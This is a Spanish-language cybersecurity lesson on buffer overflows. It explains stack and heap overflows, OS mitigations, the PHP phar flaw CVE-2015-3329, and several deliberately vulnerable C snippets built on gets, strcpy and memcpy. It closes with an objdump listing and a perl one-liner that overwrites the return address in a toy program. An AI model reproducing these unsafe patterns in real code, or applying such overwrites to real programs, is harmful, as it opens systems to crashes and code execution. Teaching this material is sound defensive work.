![Buffer4](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer4.png?raw=true)

De hecho, cuando la funci√≥n lee la cadena de caracteres IP y la coloca en el b√∫fer de destino, la direcci√≥n de retorno se reemplaza por la direcci√≥n del c√≥digo malicioso. Cuando finaliza la funci√≥n, la ejecuci√≥n del programa salta al c√≥digo malicioso.

## **Tipos de ataques de desbordamiento de b√∫fer**

Los desbordamientos del b√∫fer basados ‚Äã‚Äãen pilas son m√°s comunes y aprovechan la memoria de la pila que solo existe durante el tiempo de ejecuci√≥n de una funci√≥n.

**Los ataques basados ‚Äã‚Äãen mont√≥n** son m√°s dif√≠ciles de llevar a cabo e implican inundar el espacio de memoria asignado para un programa m√°s all√° de la memoria utilizada para las operaciones actuales en tiempo de ejecuci√≥n.

### **¬øQu√© lenguajes de programaci√≥n son m√°s vulnerables?**

C y C++ son dos lenguajes muy susceptibles a ataques de desbordamiento de b√∫fer, ya que no tienen protecciones integradas contra la sobrescritura o el acceso a datos en su memoria. Mac OSX, Windows y Linux utilizan c√≥digo escrito en C y C++.

Lenguajes como PERL, Java, JavaScript y C# utilizan mecanismos de seguridad integrados que minimizan la probabilidad de desbordamiento del b√∫fer.

### **C√≥mo prevenir los desbordamientos del b√∫fer**

Los desarrolladores pueden protegerse contra las vulnerabilidades de desbordamiento del b√∫fer mediante medidas de seguridad en su c√≥digo o utilizando lenguajes que ofrecen protecci√≥n integrada.

Adem√°s, los sistemas operativos modernos tienen protecci√≥n en tiempo de ejecuci√≥n. Tres protecciones comunes son:

- **Aleatorizaci√≥n del espacio de direcciones (ASLR)**: se mueve aleatoriamente por las ubicaciones del espacio de direcciones de las regiones de datos. Normalmente, los ataques de desbordamiento de b√∫fer necesitan conocer la localidad del c√≥digo ejecutable, y la aleatorizaci√≥n de los espacios de direcciones hace que esto sea pr√°cticamente imposible.
- **Prevenci√≥n de ejecuci√≥n de datos:** marca ciertas √°reas de la memoria como no ejecutables o ejecutables, lo que impide que un ataque ejecute c√≥digo en una regi√≥n no ejecutable.
- **Protecci√≥n de sobrescritura del controlador de excepciones estructurado (SEHOP)**: ayuda a evitar que el c√≥digo malicioso ataque el manejo de excepciones estructurado (SEH), un sistema integrado para administrar excepciones de hardware y software. De este modo, evita que un atacante pueda hacer uso de la t√©cnica de explotaci√≥n de sobrescritura SEH. A nivel funcional, una sobrescritura de SEH se logra utilizando un desbordamiento de b√∫fer basado en pila para sobrescribir un registro de registro de excepci√≥n, almacenado en la pila de un subproceso.

Mant√©ngase al d√≠a con los √∫ltimos informes de errores para sus productos de servidor web y de aplicaciones y otros productos en su infraestructura de Internet. Aplique los parches m√°s recientes a estos productos. Escanee peri√≥dicamente su sitio web con uno o m√°s de los esc√°neres com√∫nmente disponibles que buscan fallas de desbordamiento del b√∫fer en sus productos de servidor y sus aplicaciones web personalizadas.

Para el c√≥digo de su aplicaci√≥n personalizada, debe revisar todo el c√≥digo que acepta entradas de los usuarios a trav√©s de la solicitud HTTP y asegurarse de que proporciona una verificaci√≥n del tama√±o adecuado en todas esas entradas. Esto se debe hacer incluso en entornos que no son susceptibles a este tipo de ataques, ya que entradas demasiado grandes que no se detectan a√∫n pueden causar denegaci√≥n de servicio u otros problemas operativos.

Las medidas de seguridad en el c√≥digo y la protecci√≥n del sistema operativo no son suficientes. Cuando una organizaci√≥n descubre una vulnerabilidad de desbordamiento del b√∫fer, debe reaccionar r√°pidamente para parchear el software afectado y asegurarse de que los usuarios del software puedan acceder al parche.

Los programadores pueden mitigar el riesgo de ataques de desbordamiento del b√∫fer validando siempre la longitud de la entrada del usuario. Sin embargo, una buena forma general de evitar las vulnerabilidades de desbordamiento del b√∫fer es seguir utilizando funciones seguras que incluyan protecci√≥n contra desbordamiento del b√∫fer (que¬† memcpy no la incluye). Estas funciones est√°n disponibles en diferentes plataformas, por ejemplo, strlcpy, strlcat, snprintf(OpenBSD) o strcpy_s, strcat_s, sprintf_s(Windows).

### **Categorizaci√≥n de NVD**

> CWE-788: Acceso a la ubicaci√≥n de la memoria despu√©s del final del b√∫fer : esto suele ocurrir cuando un puntero o su √≠ndice se incrementa a una posici√≥n despu√©s del b√∫fer; o cuando la aritm√©tica de punteros da como resultado una posici√≥n despu√©s del b√∫fer.
> 

El desbordamiento de b√∫fer es probablemente la forma m√°s conocida de vulnerabilidad de seguridad del software. La mayor√≠a de los desarrolladores de software saben qu√© es una vulnerabilidad de desbordamiento de b√∫fer, pero los ataques de desbordamiento de b√∫fer contra aplicaciones heredadas y recientemente desarrolladas siguen siendo bastante comunes. Parte del problema se debe a la amplia variedad de formas en que pueden ocurrir los desbordamientos del b√∫fer, y parte se debe a las t√©cnicas propensas a errores que se utilizan a menudo para evitarlos.

Los desbordamientos de b√∫fer no son f√°ciles de descubrir e incluso cuando se descubre uno, generalmente es extremadamente dif√≠cil de explotar. Sin embargo, los atacantes han logrado identificar desbordamientos de b√∫fer en una asombrosa variedad de productos y componentes.

En un exploit cl√°sico de desbordamiento de b√∫fer, el atacante env√≠a datos a un programa, que los almacena en un b√∫fer de pila de tama√±o insuficiente. El resultado es que se sobrescribe la informaci√≥n de la pila de llamadas, incluido el puntero de retorno de la funci√≥n. Los datos establecen el valor del puntero de retorno para que cuando la funci√≥n regrese, transfiera el control al c√≥digo malicioso contenido en los datos del atacante.

Aunque este tipo de desbordamiento del b√∫fer de pila sigue siendo com√∫n en algunas plataformas y en algunas comunidades de desarrollo, existe una variedad de otros tipos de desbordamiento del b√∫fer, incluido el desbordamiento del b√∫fer de mont√≥n y el error de uno por uno, entre otros. Otra clase de falla muy similar se conoce como [ataque de cadena de formato](https://owasp.org/www-community/attacks/Format_string_attack) . Hay varios libros excelentes que brindan informaci√≥n detallada sobre c√≥mo funcionan los ataques de desbordamiento de b√∫fer, incluidos Building Secure Software, Writing Secure Code y The Shellcoder's Handbook.

A nivel de c√≥digo, las vulnerabilidades de desbordamiento del b√∫fer generalmente implican la violaci√≥n de las suposiciones del programador. Muchas funciones de manipulaci√≥n de memoria en C y C++ no realizan verificaci√≥n de l√≠mites y pueden sobrescribir f√°cilmente los l√≠mites asignados de los b√∫feres sobre los que operan. Incluso las funciones limitadas, como strncpy(), pueden causar vulnerabilidades cuando se usan incorrectamente. La combinaci√≥n de manipulaci√≥n de la memoria y suposiciones err√≥neas sobre el tama√±o o la composici√≥n de un dato es la causa principal de la mayor√≠a de los desbordamientos del b√∫fer.

Las vulnerabilidades de desbordamiento del b√∫fer suelen ocurrir en c√≥digo que:

- Se basa en datos externos para controlar su comportamiento.
- Depende de las propiedades de los datos que se aplican fuera del alcance inmediato del c√≥digo.
- Es tan complejo que un programador no puede predecir con precisi√≥n su comportamiento.

Desde el descubrimiento de la t√©cnica de ataque de desbordamiento del b√∫fer de pila, los autores de sistemas operativos (Linux, Microsoft Windows, macOS y otros) han intentado encontrar t√©cnicas de prevenci√≥n:

- La pila se puede hacer no ejecutable, por lo que incluso si se coloca c√≥digo malicioso en el b√∫fer, no se puede ejecutar.
- El sistema operativo puede aleatorizar el dise√±o de la memoria del espacio de direcciones (espacio de memoria). Cuando el c√≥digo malicioso se coloca en un b√∫fer, el atacante no puede predecir su direcci√≥n.
- Otras t√©cnicas de protecci√≥n (por ejemplo, StackGuard) modifican un compilador de tal manera que cada funci√≥n llama a un fragmento de c√≥digo que garantiza que la direcci√≥n del remitente no haya cambiado.

En la pr√°ctica, incluso si dichos mecanismos de protecci√≥n dificultan los ataques de desbordamiento del b√∫fer de pila, no los hacen imposibles. Algunas de estas medidas tambi√©n pueden afectar el rendimiento. Las vulnerabilidades de desbordamiento de b√∫fer existen en lenguajes de programaci√≥n que, como C, intercambian seguridad por eficiencia y no verifican el acceso a la memoria. En los lenguajes de programaci√≥n de nivel superior (por ejemplo, Python, Java, PHP, JavaScript o Perl), que se utilizan a menudo para crear aplicaciones web, las vulnerabilidades de desbordamiento del b√∫fer no pueden existir. En estos idiomas, simplemente no se pueden colocar datos sobrantes en el b√∫fer de destino. Por ejemplo, intente compilar y ejecutar el siguiente c√≥digo Java:

> int[] buffer = new int[5];
> 
> 
> buffer[100] = 44;
> 

El compilador de Java no le avisar√°, pero la m√°quina virtual Java en tiempo de ejecuci√≥n detectar√° el problema y, en lugar de sobrescribir la memoria aleatoria, interrumpir√° la ejecuci√≥n del programa.

### **Desbordamiento de b√∫fer y aplicaciones web**

Los atacantes utilizan desbordamientos de b√∫fer para corromper la pila de ejecuci√≥n de una aplicaci√≥n web. Al enviar informaci√≥n cuidadosamente dise√±ada a una aplicaci√≥n web, un atacante puede hacer que la aplicaci√≥n web ejecute c√≥digo arbitrario, apoder√°ndose efectivamente de la m√°quina.

Las fallas de desbordamiento de b√∫fer pueden estar presentes tanto en el servidor web como en los productos del servidor de aplicaciones que atienden los aspectos est√°ticos y din√°micos del sitio, o en la aplicaci√≥n web misma. Es probable que los desbordamientos de b√∫fer que se encuentran en productos de servidor ampliamente utilizados se vuelvan ampliamente conocidos y puedan representar un riesgo significativo para los usuarios de estos productos. Cuando las aplicaciones web utilizan bibliotecas, como una biblioteca de gr√°ficos para generar im√°genes, se exponen a posibles ataques de desbordamiento del b√∫fer.

Los desbordamientos de b√∫fer tambi√©n se pueden encontrar en el c√≥digo de aplicaciones web personalizadas, e incluso pueden ser m√°s probables dada la falta de escrutinio por el que suelen pasar las aplicaciones web. Es menos probable que se detecten fallas de desbordamiento de b√∫fer en aplicaciones web personalizadas porque normalmente habr√° muchos menos piratas inform√°ticos que intenten encontrar y explotar dichas fallas en una aplicaci√≥n espec√≠fica. Si se descubre en una aplicaci√≥n personalizada, la capacidad de explotar la falla (aparte de bloquear la aplicaci√≥n) se reduce significativamente por el hecho de que el c√≥digo fuente y los mensajes de error detallados de la aplicaci√≥n normalmente no est√°n disponibles para el pirata inform√°tico.

Sin embargo, incluso los programadores que utilizan lenguajes de alto nivel deber√≠an conocer y preocuparse por los ataques de desbordamiento del b√∫fer. Sus programas a menudo se ejecutan dentro de sistemas operativos escritos en C o utilizan entornos de ejecuci√≥n escritos en C, y este c√≥digo C puede ser vulnerable a tales ataques.

Para ver c√≥mo una vulnerabilidad de desbordamiento de b√∫fer puede afectar a un programador que utiliza un lenguaje de programaci√≥n de tan alto nivel, analicemos [CVE-2015-3329](https://nvd.nist.gov/vuln/detail/CVE-2015-3329) , una vulnerabilidad de seguridad de la vida real descubierta en la biblioteca est√°ndar PHP en 2015. Una aplicaci√≥n PHP es una colecci√≥n de archivos **.php* . Para facilitar la distribuci√≥n de dicha aplicaci√≥n, se puede empaquetar en un √∫nico archivo, como un archivo *zip* , un archivo *tar* o utilizando un formato PHP personalizado llamado *phar* .

Una extensi√≥n PHP llamada *phar* contiene una clase que puede utilizar para trabajar con dichos archivos. Con esta clase, puede analizar un archivo, enumerar sus archivos, extraerlos, etc. Usar esta clase es bastante simple. Por ejemplo, para extraer todos los archivos de un archivo, utilice el siguiente c√≥digo:

> $phar = new Phar('phar-file.phar');
> 
> 
> $phar->extractTo('./directory');
> 

Cuando la clase Phar analiza un archivo (es decir¬† new Phar('phar-file.phar')), lee todos los nombres de archivo del archivo, concatena cada nombre de archivo con el nombre del archivo y luego calcula la suma de verificaci√≥n. Por ejemplo, para un archivo llamado *myarchive.phar* que contiene archivos *index.php* y *componentes/hello.php* , la clase Phar calcula sumas de verificaci√≥n de dos cadenas: *myarchive.pharindex.php* y *myarchive.pharcomponents/hello.php* .

La raz√≥n por la que los autores lo implementaron de esta manera no es importante aqu√≠; lo importante es *c√≥mo* lo implementaron. Hasta 2015, esta operaci√≥n se realizaba mediante la siguiente funci√≥n (ver el antiguo [c√≥digo fuente PHP](https://git.php.net/?p=php-src.git;a=blob;f=ext/phar/phar_internal.h;h=fcfc86457d623350b93e88ab2438a07093bdde86) ):

phar_set_inode(phar_entry_info *entry TSRMLS_DC) /* {{{ */

{

char tmp[MAXPATHLEN];

int tmp_len;

tmp_len = entry->filename_len + entry->phar->fname_len;

memcpy(tmp, entry->phar->fname, entry->phar->fname_len);

memcpy(tmp + entry->phar->fname_len, entry->filename, entry->filename_len);

entry->inode = (unsigned short)zend_get_hash_value(tmp, tmp_len);

}

Como puede ver, esta funci√≥n crea una matriz char de llamados tmp. Primero, el nombre del archivo phar (en nuestro ejemplo, *myarchive.phar* ) se copia en esta matriz usando el siguiente comando:

memcpy(tmp,entry->phar->fname,entry->phar->fname_len);

En este comando:

- El primer argumento, tmpes un destino donde se deben copiar los bytes.
- El segundo argumento, entry->phar->fname, es una fuente desde donde se deben copiar los bytes; en nuestro caso, el nombre del archivo ( *myarchive.phar* ).
- El tercer argumento, entry->phar->fname_lenes una cantidad de bytes que deben copiarse; en nuestro caso, es la longitud (en bytes) del nombre del archivo comprimido.

La funci√≥n copia el nombre del archivo (en nuestro ejemplo, *index.php* o *componentes/hello.php* ) en la tmpmatriz de caracteres usando el siguiente comando:

memcpy(tmp + entry->phar->fname_len, entry->filename, entry->filename_len);

En este comando:

- El primer argumento, tmp + entry->phar->fname_lenes un destino donde se deben copiar los bytes; en nuestro caso, es una ubicaci√≥n en la tmpmatriz justo despu√©s del final del nombre del archivo.
- El segundo argumento, entry->filenamees una fuente desde donde se deben copiar los bytes.
- El tercer argumento, entry->filename_lenes una cantidad de bytes que deben copiarse.

Luego zend_get_hash_valuese llama a la funci√≥n para calcular el c√≥digo hash. Observe c√≥mo se declara el tama√±o del b√∫fer:

`char tmp[MAXPATHLEN];`

Tiene un tama√±o de MAXPATHLEN, que es una constante definida como la longitud m√°xima de una ruta del sistema de archivos en la plataforma actual. Los autores asumieron que si concatenan el nombre del archivo con el nombre de un archivo dentro del archivo, nunca exceder√°n la longitud de ruta m√°xima permitida. En situaciones normales, este supuesto se cumple. Sin embargo, si el atacante prepara un archivo con nombres inusualmente largos, es inminente un desbordamiento del b√∫fer.

La funci√≥n phar_set_inode provocar√° un desbordamiento en la matriz tmp. Un atacante puede usar esto para bloquear PHP (provocando una denegaci√≥n de servicio) o incluso hacer que ejecute c√≥digo malicioso. El problema es similar a nuestro ejemplo simple de arriba: el programador cometi√≥ un simple error, confi√≥ demasiado en la entrada del usuario y asumi√≥ que los datos siempre cabr√≠an en un b√∫fer de tama√±o fijo. Afortunadamente, esta vulnerabilidad fue [descubierta en 2015 y solucionada](https://git.php.net/?p=php-src.git;a=commitdiff;h=f59b67ae50064560d7bfcdb0d6a8ab284179053c) .

### **Consecuencias**

- Categor√≠a: Disponibilidad: los desbordamientos del b√∫fer generalmente provocan fallos. Son posibles otros ataques que provoquen falta de disponibilidad, incluido poner el programa en un bucle infinito.
- Control de acceso (procesamiento de instrucciones): los desbordamientos del b√∫fer a menudo se pueden utilizar para ejecutar c√≥digo arbitrario, que generalmente est√° fuera del alcance de la pol√≠tica de seguridad impl√≠cita de un programa.
- Otro: cuando la consecuencia es la ejecuci√≥n de c√≥digo arbitrario, esto a menudo puede usarse para subvertir cualquier otro servicio de seguridad.

### **Periodo de exposici√≥n**

- Especificaci√≥n de requisitos: Se podr√≠a optar por utilizar un lenguaje que no sea susceptible a estos problemas.
- Dise√±o: Se podr√≠an introducir tecnolog√≠as de mitigaci√≥n, como bibliotecas de cadenas seguras y abstracciones de contenedores.
- Implementaci√≥n: muchos errores l√≥gicos pueden provocar esta condici√≥n. Puede verse exacerbado por la falta o el mal uso de tecnolog√≠as de mitigaci√≥n.

### **Ambientes afectados**

Casi todos los servidores web, servidores de aplicaciones y entornos de aplicaciones web conocidos son susceptibles a desbordamientos de b√∫fer, con la excepci√≥n notable de los entornos escritos en lenguajes interpretados como Java o Python, que son inmunes a estos ataques (excepto los desbordamientos en el propio Interpretor).

### **Plataforma**

- Idiomas: C, C++, Fortran, Ensamblador
- Plataformas operativas: Todas, aunque se podr√°n implementar medidas preventivas parciales, dependiendo del entorno.

**C√≥mo determinar si eres vulnerable**

Para productos de servidor y bibliotecas, mant√©ngase actualizado con los √∫ltimos informes de errores de los productos que est√° utilizando. Para el software de aplicaci√≥n personalizado, todo el c√≥digo que acepta entradas de los usuarios a trav√©s de la solicitud HTTP debe revisarse para garantizar que pueda manejar adecuadamente entradas arbitrariamente grandes.

- **Ejemplo 1**

El siguiente c√≥digo de ejemplo demuestra un desbordamiento de b√∫fer simple que a menudo es causado por el primer escenario en el que el c√≥digo depende de datos externos para controlar su comportamiento. El c√≥digo utiliza la funci√≥n get() para leer una cantidad arbitraria de datos en un b√∫fer de pila. Debido a que no hay forma de limitar la cantidad de datos le√≠dos por esta funci√≥n, la seguridad del c√≥digo depende de que el usuario ingrese siempre menos de caracteres BUFSIZE.

> ...
> 
> 
> char buf[BUFSIZE];
> 
> gets(buf);
> 
> ‚Ä¶
> 

Este ejemplo muestra lo f√°cil que es imitar el comportamiento inseguro de la funci√≥n gets() en C++ utilizando el >>operador para leer la entrada en una cadena char[].

> ...
> 
> 
> char buf[BUFSIZE];
> 
> cin >> (buf);
> 
> ‚Ä¶

- **Ejemplo 2**

El c√≥digo de este ejemplo tambi√©n se basa en la entrada del usuario para controlar su comportamiento, pero agrega un nivel de direccionamiento indirecto con el uso de la funci√≥n de copia de memoria limitada memcpy(). Esta funci√≥n acepta un b√∫fer de destino, un b√∫fer de origen y la cantidad de bytes para copiar. El b√∫fer de entrada se llena mediante una llamada limitada a read(), pero el usuario especifica el n√∫mero de bytes que copia memcpy().

> ...
> 
> 
> char buf[64], in[MAX_SIZE];
> 
> printf("Enter buffer contents:\n");
> 
> read(0, in, MAX_SIZE-1);
> 
> printf("Bytes to copy:\n");
> 
> scanf("%d", &bytes);
> 
> memcpy(buf, in, bytes);
> 
> ‚Ä¶

**Nota:** Este tipo de vulnerabilidad de desbordamiento del b√∫fer (donde un programa lee datos y luego conf√≠a en un valor de los datos en operaciones de memoria posteriores sobre los datos restantes) ha aparecido con cierta frecuencia en bibliotecas de procesamiento de im√°genes, audio y otros archivos.

- **Ejemplo 3**

Este es un ejemplo del segundo escenario en el que el c√≥digo depende de propiedades de los datos que no se verifican localmente. En este ejemplo, una funci√≥n denominada lccopy()toma una cadena como argumento y devuelve una copia de la cadena asignada al mont√≥n con todas las letras may√∫sculas convertidas a min√∫sculas. La funci√≥n realiza una verificaci√≥n sin l√≠mites en su entrada porque espera que str siempre sea menor que BUFSIZE. Si un atacante pasa por alto las comprobaciones en el c√≥digo que llama a lccopy(), o si un cambio en ese c√≥digo hace que la suposici√≥n sobre el tama√±o de str sea falsa, entonces lccopy()se desbordar√° buf con la llamada ilimitada a strcpy().

> char *lccopy(const char *str) {
> 
> 
> char buf[BUFSIZE];
> 
> char *p;
> 
> strcpy(buf, str);
> 
> for (p = buf; *p; p++) {
> 
> if (isupper(*p)) {
> 
> *p = tolower(*p);
> 
> }
> 
> }
> 
> return strdup(buf);
> 
> }
> 
- **Ejemplo 4**

El siguiente c√≥digo demuestra el tercer escenario en el que el c√≥digo es tan complejo que su comportamiento no se puede predecir f√°cilmente. Este c√≥digo proviene del popular decodificador de im√°genes libPNG, que es utilizado por una amplia gama de aplicaciones, incluidas Mozilla y algunas versiones de Internet Explorer.

El c√≥digo parece realizar la verificaci√≥n de l√≠mites de manera segura porque verifica el tama√±o de la longitud variable, que luego usa para controlar la cantidad de datos copiados por png_crc_read(). Sin embargo, inmediatamente antes de probar la longitud, el c√≥digo realiza una verificaci√≥n png_ptr->modey, si esta verificaci√≥n falla, se emite una advertencia y el procesamiento contin√∫a. Debido a que la longitud se prueba en un bloque else if, la longitud no se probar√° si la primera verificaci√≥n falla y se usa ciegamente en la llamada a png_crc_read(), lo que potencialmente permite un desbordamiento del b√∫fer de pila.

Aunque el c√≥digo de este ejemplo no es el m√°s complejo que hemos visto, demuestra por qu√© se debe minimizar la complejidad en el c√≥digo que realiza operaciones de memoria.

> if (!(png_ptr->mode & PNG_HAVE_PLTE)) {
> 
> 
> /* Should be an error, but we can cope with it */
> 
> png_warning(png_ptr, "Missing PLTE before tRNS");
> 
> }
> 
> else if (length > (png_uint_32)png_ptr->num_palette) {
> 
> png_warning(png_ptr, "Incorrect tRNS chunk length");
> 
> png_crc_finish(png_ptr, length);
> 
> return;
> 
> }
> 
> ...
> 
> png_crc_read(png_ptr, readbuf, (png_size_t)length);
> 
- **Ejemplo 5**

Este ejemplo tambi√©n demuestra el tercer escenario en el que la complejidad del programa lo expone a desbordamientos del b√∫fer. En este caso, la exposici√≥n se debe a la interfaz ambigua de una de las funciones y no a la estructura del c√≥digo (como fue el caso en el ejemplo anterior).

La getUserInfo()funci√≥n toma un nombre de usuario especificado como una cadena multibyte y un puntero a una estructura para informaci√≥n del usuario, y completa la estructura con informaci√≥n sobre el usuario. Dado que la autenticaci√≥n de Windows utiliza Unicode para los nombres de usuario, el argumento del nombre de usuario primero se convierte de una cadena multibyte a una cadena Unicode. Luego, esta funci√≥n pasa incorrectamente el tama√±o en unicodeUser bytes en lugar de caracteres.

Por lo tanto, la llamada a MultiByteToWideChar()puede escribir hasta (UNLEN+1)*sizeof(WCHAR)caracteres anchos, o (UNLEN+1)*sizeof(WCHAR)*sizeof(WCHAR)bytes, en la matriz unicodeUser, que solo tiene (UNLEN+1)*sizeof(WCHAR)bytes asignados. Si la cadena del nombre de usuario contiene m√°s de UNLENcaracteres, la llamada a MultiByteToWideChar()desbordar√° el b√∫fer unicodeUser.

> void getUserInfo(char *username, struct _USER_INFO_2 info){
> 
> 
> WCHAR unicodeUser[UNLEN+1];
> 
> MultiByteToWideChar(CP_ACP, 0, username, -1,
> 
> unicodeUser, sizeof(unicodeUser));
> 
> NetUserGetInfo(NULL, unicodeUser, 2, (LPBYTE *)&info);
> 
> }
> 

## **Ataque de desbordamiento de b√∫fer**

Los errores de desbordamiento de b√∫fer se caracterizan por la sobrescritura de fragmentos de memoria del proceso, que nunca debieron haber sido modificados de forma intencionada o no. La sobrescritura de valores de IP (puntero de instrucci√≥n), BP (puntero base) y otros registros provoca excepciones, fallas de segmentaci√≥n y otros errores. Generalmente estos errores finalizan la ejecuci√≥n de la aplicaci√≥n de forma inesperada. Los errores de desbordamiento del b√∫fer ocurren cuando operamos con b√∫feres de tipo char.

Los desbordamientos del b√∫fer pueden consistir en desbordar la pila [Stack overflow] o desbordar el mont√≥n [Heap overflow]. No distinguimos entre estos dos en este art√≠culo para evitar confusiones. Los siguientes ejemplos est√°n escritos en lenguaje C bajo el sistema GNU/Linux en arquitectura x86.

- **Ejemplo 1**

> #include <stdio.h>
> 
> 
> int main(int argc, char **argv)
> 
> {
> 
> char buf[8]; // buffer for eight characters
> 
> gets(buf); // read from stdio (sensitive function!)
> 
> printf("%s\n", buf); // print out data stored in buf
> 
> return 0; // 0 as return value
> 
> }
> 

Esta aplicaci√≥n muy simple lee de la entrada est√°ndar una matriz de caracteres y la copia en el b√∫fer del tipo char. El tama√±o de este b√∫fer es de ocho caracteres. Despu√©s de eso, se muestra el contenido del b√∫fer y la aplicaci√≥n se cierra.

**Compilaci√≥n del programa:**

> user@spin ~/inzynieria $ gcc bo-simple.c -obo-simple
> 
> 
> /tmp/ccECXQAX.o: In function `main':
> 
> bo-simple.c:(.text+0x17): warning: the `gets' function is dangerous and
> 
> should not be used.
> 

En esta etapa, incluso el compilador sugiere que la funci√≥n gets() no es segura.

**Ejemplo de uso:**

> user@spin ~/inzynieria $ ./bo-simple // program start
> 
> 
> 1234 // we eneter "1234" string from the keyboard
> 
> 1234 // program prints out the conent of the buffer
> 
> user@spin ~/inzynieria $ ./bo-simple // start
> 
> 123456789012 // we eneter "123456789012"
> 
> 123456789012 // content of the buffer "buf" ?!?!
> 
> Segmentation fault // information about memory segmenatation fault
> 

Logramos (des)afortunadamente ejecutar la operaci√≥n defectuosa del programa y provocamos que salga de manera anormal.

### **An√°lisis del problema:**

El programa llama a una funci√≥n que opera en el b√∫fer de tipo char y no realiza comprobaciones para evitar que se desborde el tama√±o asignado a este b√∫fer. Como resultado, es posible almacenar intencionalmente o no m√°s datos en el b√∫fer, lo que provocar√° un error. Surge la siguiente pregunta: El buffer almacena s√≥lo ocho caracteres, entonces ¬øpor qu√© la funci√≥n printf() muestra doce? La respuesta proviene de la organizaci√≥n de la memoria de procesos. Cuatro caracteres que desbordaron el b√∫fer tambi√©n sobrescriben el valor almacenado en uno de los registros, que era necesario para el retorno correcto de la funci√≥n. La continuidad de la memoria result√≥ en la impresi√≥n de los datos almacenados en esta √°rea de la memoria.

- **Ejemplo 2**

> #include <stdio.h>
> 
> 
> #include <string.h>
> 
> void doit(void)
> 
> {
> 
> char buf[8];
> 
> gets(buf);
> 
> printf("%s\n", buf);
> 
> }
> 
> int main(void)
> 
> {
> 
> printf("So... The End...\n");
> 
> doit();
> 
> printf("or... maybe not?\n");
> 
> return 0;
> 
> }
> 

Este ejemplo es an√°logo al primero. Adem√°s, antes y despu√©s de la funci√≥n doit(), tenemos dos llamadas a la funci√≥n printf().

> Compilation:
> 
> 
> user@dojo-labs ~/owasp/buffer_overflow $ gcc example02.c -oexample02
> 
> -ggdb
> 
> /tmp/cccbMjcN.o: In function `doit':
> 
> /home/user/owasp/buffer_overflow/example02.c:8: warning: the `gets'
> 
> function is dangerous and should not be used.
> 
> Usage example:
> 
> user@dojo-labs ~/owasp/buffer_overflow $ ./example02
> 
> So... The End...
> 
> TEST ¬† ¬† ¬† ¬† ¬† ¬† ¬† // user data on input
> 
> TEST¬† ¬† ¬† ¬† ¬† ¬† ¬† // print out stored user data
> 
> or... maybe not?
> 

El programa entre las dos llamadas printf() definidas muestra el contenido del b√∫fer, que se llena con los datos ingresados ‚Äã‚Äãpor el usuario.

> user@dojo-labs ~/owasp/buffer_overflow $ ./example02
> 
> 
> So... The End...
> 
> TEST123456789
> 
> TEST123456789
> 
> Segmentation fault
> 

Debido a que se defini√≥ el tama√±o del buffer (char buf[8]) y se llen√≥ con trece caracteres de tipo char, el buffer se desbord√≥. Si nuestra aplicaci√≥n binaria est√° en formato ELF, entonces podemos usar un programa objdump para analizarla y encontrar la informaci√≥n necesaria para explotar el error de desbordamiento del b√∫fer. A continuaci√≥n se muestra el resultado producido por objdump. A partir de esa salida podemos encontrar direcciones, donde se llama a printf() (0x80483d6 y 0x80483e7).

> user@dojo-labs ~/owasp/buffer_overflow $ objdump -d./example02
> 
> 
> 080483be <main>:
> 
> 80483be: ¬† 8d 4c 24 04 ¬† ¬† ¬† ¬† lea 0x4(%esp),%ecx
> 
> 80483c2: ¬† 83 e4 f0¬† ¬† ¬† ¬† ¬† ¬† and $0xfffffff0,%esp
> 
> 80483c5: ¬† ff 71 fc¬† ¬† ¬† ¬† ¬† ¬† pushl¬† 0xfffffffc(%ecx)
> 
> 80483c8: ¬† 55¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† push ¬† %ebp
> 
> 80483c9: ¬† 89 e5 ¬† ¬† ¬† ¬† ¬† ¬† ¬† mov %esp,%ebp
> 
> 80483cb: ¬† 51¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† push ¬† %ecx
> 
> 80483cc: ¬† 83 ec 04¬† ¬† ¬† ¬† ¬† ¬† sub $0x4,%esp
> 
> 80483cf: ¬† c7 04 24 bc 84 04 08 movl ¬† $0x80484bc,(%esp) 80483d6: ¬† ¬† ¬† e8 f5 fe ff ff¬† ¬† ¬† call ¬† 80482d0 <puts@plt>
> 
> 80483db: ¬† e8 c0 ff ff ff¬† ¬† ¬† call ¬† 80483a0 <doit>
> 
> 80483e0: ¬† c7 04 24 cd 84 04 08 movl ¬† $0x80484cd,(%esp) 80483e7: ¬† ¬† ¬† e8 e4 fe ff ff¬† ¬† ¬† call ¬† 80482d0 <puts@plt>
> 
> 80483ec: ¬† b8 00 00 00 00¬† ¬† ¬† mov¬† ¬† $0x0,%eax
> 
> 80483f1: ¬† 83 c4 04¬† ¬† ¬† ¬† ¬† ¬† add $0x4,%esp
> 
> 80483f4: ¬† 59¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† pop %ecx
> 
> 80483f5: ¬† 5d¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† pop %ebp
> 
> 80483f6: ¬† 8d 61 fc¬† ¬† ¬† ¬† ¬† ¬† lea 0xfffffffc(%ecx),%esp
> 
> 80483f9: ¬† c3¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ret
> 
> 80483fa: ¬† 90¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† nop
> 
> 80483fb: ¬† 90¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† ¬† nop
>

Si la segunda llamada a printf() informar√≠a al administrador sobre el cierre de sesi√≥n del usuario (por ejemplo, sesi√≥n cerrada), entonces podemos intentar omitir este paso y finalizar sin la llamada a printf().

> user@dojo-labs ~/owasp/buffer_overflow $ perl -e'print "A"x12
> 
> 
> ."\xf9\x83\x04\x08"' | ./example02
> 
> So... The End...
> 
> AAAAAAAAAAAAu*.
> 
> Segmentation fault

La aplicaci√≥n finaliz√≥ su ejecuci√≥n con fallo de segmentaci√≥n, pero la segunda llamada a printf() no tuvo cabida. Algunas palabras de explicaci√≥n:

perl -e 'print ‚ÄúA‚Äùx12 .‚Äù\xf9\x83\x04\x08‚Äù' - imprimir√° doce caracteres ‚ÄúA‚Äù y luego cuatro caracteres, que de hecho son una direcci√≥n de la instrucci√≥n que queremos ejecutar. ¬øPor qu√© doce?

> 8 // size of buf (char buf[8])
> 
> 
> +¬† 4 // four additional bytes for overwriting stack frame pointer
> 
> ----
> 
> 12
> 

### **An√°lisis del problema:**

La cuesti√≥n es la misma que en el primer ejemplo. No hay control sobre el tama√±o del buffer copiado en el previamente declarado. En este ejemplo, sobrescribimos el registro EIP con la direcci√≥n 0x080483f9, que de hecho es una llamada a ret en la √∫ltima fase de la ejecuci√≥n del programa.

